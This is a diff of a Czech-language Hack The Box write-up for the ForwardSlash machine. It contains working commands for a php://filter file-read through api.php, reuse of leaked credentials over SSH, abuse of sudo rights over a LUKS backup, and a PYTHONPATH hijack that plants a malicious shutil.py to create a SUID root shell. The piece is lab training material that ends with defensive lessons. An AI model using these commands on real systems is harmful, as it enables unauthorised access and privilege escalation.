@@ -7,156 +7,104 @@ tags: linux lfi rce ssh sudo php
 ---
 ## Úvod a kontext
 
-Na ForwardSlash je nejzajímavější, jak se propojí `fuzz.forwardslash.htb`, `backup.forwardslash.htb` a webová aplikace v PHP.
+ForwardSlash je dobrý příklad řetězce, kde první foothold vznikne z webové chyby, ale root už je čistě lokální Python a `sudo` problém. Začíná to vhosty `forwardslash.htb` a `backup.forwardslash.htb`, pokračuje file read přes `php://filter` a pak se útok přesune z webu na SSH.
 
-Bez pochopení této návaznosti by nedával smysl ani SSH s nalezenými přihlašovacími údaji, ani závěrečná příliš široká `sudo` oprávnění.
+Na tom stroji je důležité správně číst návaznost kroků. LFI na `backup.forwardslash.htb` dává heslo pro účet `pain`; ten díky `sudo` pravidlům otevře šifrovanou zálohu a z ní získá klíč k účtu `chiv`. Teprve `chiv` má pak přístup k rootu přes špatně navržený Python backup skript a `PYTHONPATH` hijacking.
 
 ## Počáteční průzkum
 
-### Vyhledání otevřených portů
+### Vhosty a vývojová část webu
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+První `nmap` ukáže jen SSH a Apache, takže stejně jako u jiných vhostových strojů dává smysl hledat další hostname. Hlavní web navíc obsahuje `note.txt` a druhý vhost `backup.forwardslash.htb`, na kterém leží vývojová cesta `/dev/`.
 ```bash
 ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
-```
-
-### Detailní analýza služeb
-
-V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
-```text
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-```
-```
-| ssh-hostkey:
-|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
-|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
-|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Did not follow redirect to http://forwardslash.htb
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
-### Enumerace webu
-
-Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
-```bash
 dirb http://forwardslash.htb -X ,.php,.txt,.log,.xml
-```
-```
-=> + http://forwardslash.htb/note.txt (CODE:200|SIZE:216)
-```
-
-### Enumerace webu (2)
-
-Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
-```bash
 wfuzz -H "Host: FUZZ.forwardslash.htb" -w /usr/share/wordlists/wfuzz/general/common.txt --hh 0 http://$IP
-```
-```
-=> backup.forwardslash.htb
-
 ./dirsearch/dirsearch.py -u http://backup.forwardslash.htb -e php -x 403 -r
+```
+```text
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp open  http    Apache httpd 2.4.29
+
+=> http://forwardslash.htb/note.txt
+=> backup.forwardslash.htb
 => http://backup.forwardslash.htb/dev/
 ```
 
-## Získání přístupu
+### File read přes `api.php`
 
-### Spuštění exploitu
-
-V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+V `/dev/` se ukáže endpoint `api.php`, který server-side načítá adresu poslanou v parametru `url`. Jakmile přijme i `php://filter`, nejde už o obyčejný helper pro upload, ale o čitelný lokální file include.
 ```bash
 curl -F "url=php://filter/convert.base64-encode/resource=/etc/passwd" -H "Cookie: PHPSESSID=tt2u04m6a1pb9vavplb2e88vvt;" http://backup.forwardslash.htb/api.php | base64 -d -
-```
-```
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-syslog:x:102:106::/home/syslog:/usr/sbin/nologin
-messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
-_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-lxd:x:105:65534::/var/lib/lxd/:/bin/false
-uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
-dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:109:1::/var/cache/pollinate:/bin/false
+curl -F "url=php://filter/convert.base64-encode/resource=config.php" -H "Cookie: PHPSESSID=tt2u04m6a1pb9vavplb2e88vvt;" http://backup.forwardslash.htb/api.php | base64 -d -
 ```
 
-### Spuštění exploitu (2)
+## Analýza zjištění
 
-V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
-```bash
-php://filter/convert.base64-encode/resource=config.php
+### Přihlašovací údaje pro `pain`
+
+`config.php` je na tomhle stroji zlomový soubor. Obsahuje přístupové údaje aplikace, konkrétně uživatelská jména `pain` a `backupadmin` a heslo `5n0wCr47h3R`. Jakmile se tyto údaje ukážou v konfiguračním souboru PHP aplikace, je rozumné je vyzkoušet i na SSH, protože právě to dá stabilnější přístup než další práce přes LFI.
+
+### Co dovolí `sudo` účtu `pain`
+
+Účet `pain` nemá root hned, ale `sudo -l` ukáže nezvykle široká oprávnění kolem šifrované zálohy: `cryptsetup luksOpen`, mount ` /dev/mapper/backup` a následný unmount. To je důležité, protože zálohovaný svazek často obsahuje citlivější data než živý webroot.
+```text
+ssh pain@forwardslash.htb
+
+sudo -l
+    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
+    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
+    (root) NOPASSWD: /bin/umount ./mnt/
 ```
 
-### Přihlášení na cíl (2)
+Stejné heslo `5n0wCr47h3R` funguje i jako LUKS passphrase. Po připojení svazku se v záloze objeví soukromý klíč `id_rsa` a poznámka s passphrase `Fj5AkyRhPOwMrog`, což převádí foothold z `pain` na vyšší účet `chiv`.
 
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
-```bash
-ssh chiv@forwardslash.htb
-```
+## Získání přístupu
 
-### Získání user flagu
+### Od `pain` k `chiv`
 
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
-```bash
+Tady je důležité neulpět na prvním shellu. `pain` je jen mezistanice k citlivé záloze. Přes whitelisting v `sudo` lze backup svazek korektně otevřít, připojit a z něj vytáhnout SSH klíč.
+```text
+ssh pain@forwardslash.htb
+
+sudo /sbin/cryptsetup luksOpen /var/backups/recovery.luks backup
+sudo /bin/mount /dev/mapper/backup ./mnt/
+
+cat mnt/id_rsa
+cat mnt/note.txt
+=> Fj5AkyRhPOwMrog
+
+ssh -i id_rsa chiv@forwardslash.htb
 cat user.txt
-```
-```
 __CENSORED__
 ```
 
 ## Eskalace oprávnění
 
-### Průzkum možností eskalace
+### `backup`, Python importy a `PYTHONPATH`
 
-Hledám chybné konfigurace a cesty k vyšším oprávněním.
+Účet `chiv` má přes `sudo` povolený binární wrapper `/usr/bin/backup`. Ten je napsaný v Pythonu a při běhu importuje standardní moduly bez ochrany proti přepsání importní cesty. To je přesně situace, kdy dává smysl uvažovat o Python library hijackingu místo hledání SUID nebo kernel exploitu.
+
+Stačí do vlastního adresáře připravit škodlivý modul se stejným jménem jako importovaná knihovna, nasměrovat `PYTHONPATH` na tento adresář a pak spustit `backup` přes `sudo`. Root proces pak načte útočníkův modul a vykoná jeho kód ještě před vlastním během skriptu.
 ```bash
-sudo -l
-```
-```
-    (root) NOPASSWD: __CENSORED__ luksOpen *
-    (root) NOPASSWD: __CENSORED__ /dev/mapper/backup ./mnt/
-    (root) NOPASSWD: __CENSORED__ ./mnt/
-```
+cat > /dev/shm/shutil.py <<'EOF'
+import os
+os.system("cp /bin/bash /tmp/rootshell && chmod 4777 /tmp/rootshell")
+EOF
 
-### Získání root flagu
-
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
-```bash
-cat root.txt
-```
-```
-__CENSORED__
+sudo PYTHONPATH=/dev/shm /usr/bin/backup
+/tmp/rootshell -p
+cat /root/root.txt
 ```
 
 ## Shrnutí klíčových poznatků
 
-- První skutečně užitečný závěr plynul z toho, jak do sebe zapadly `fuzz.forwardslash.htb`, `backup.forwardslash.htb` a webová aplikace v PHP.
-- User fáze se opírala o SSH s nalezenými přihlašovacími údaji, takže přístup byl reprodukovatelný a ne jen jednorázový.
-- Finální kontrolu nad systémem otevřela až mechanika typu příliš široká `sudo` oprávnění.
+- Webová část byla důležitá hlavně proto, že odhalila konfigurační tajemství. Skutečný přístup ale začal až jejich reuse na SSH.
+- Účet `pain` nebyl cíl, ale pivot. Jeho `sudo` oprávnění k šifrované záloze vedla ke klíči a passphrase pro účet `chiv`.
+- Root část je čistě o Pythonu: privilegovaný skript načetl knihovnu z útočníkem určeného `PYTHONPATH`, takže z běžného wrapperu vznikla přímá cesta k rootu.
 
 ## Co si odnést do praxe
 
-- V tomhle článku se první slabé místo otevřelo přes `fuzz.forwardslash.htb`, `backup.forwardslash.htb` a webová aplikace v PHP. Webová vrstva nesmí publikovat víc, než je nezbytné; vedlejší vhost, debug endpoint nebo zapomenutý soubor často odhalí skutečný vstup do řetězce.
-- Stabilní foothold pak stojí na principu SSH s nalezenými přihlašovacími údaji. Hesla a klíče je potřeba oddělovat mezi službami; jakmile stejné přihlašovací údaje fungují i na SSH, z lokálního úniku je plnohodnotný systémový přístup.
-- Pro závěrečnou fázi je podstatné, že rozhodla příliš široká `sudo` oprávnění. Široká `sudo` oprávnění je potřeba pravidelně revidovat; wrapper, install helper nebo diagnostický příkaz často udělá z běžného účtu roota.
+- Endpointy typu `api.php`, které server-side načítají URL nebo soubory, je nutné navrhovat jako vysoce rizikové. Jakmile přijmou `php://filter`, `file://` nebo podobné wrappery, z pomocné funkce je okamžitě file read nad celým serverem.
+- Zálohy a šifrované kontejnery je potřeba chránit stejně přísně jako produkční data. ForwardSlash ukazuje, že i když je hlavní systém zamčený, špatně delegovaný přístup k backupu může odkrýt klíče a hesla pro vyšší účty.
+- Python skripty spouštěné přes `sudo` musí mít pevně řízené importy a prostředí. Pokud lze ovlivnit `PYTHONPATH`, je libovolný import potenciální root exploit, i když samotný skript nedělá nic očividně nebezpečného.
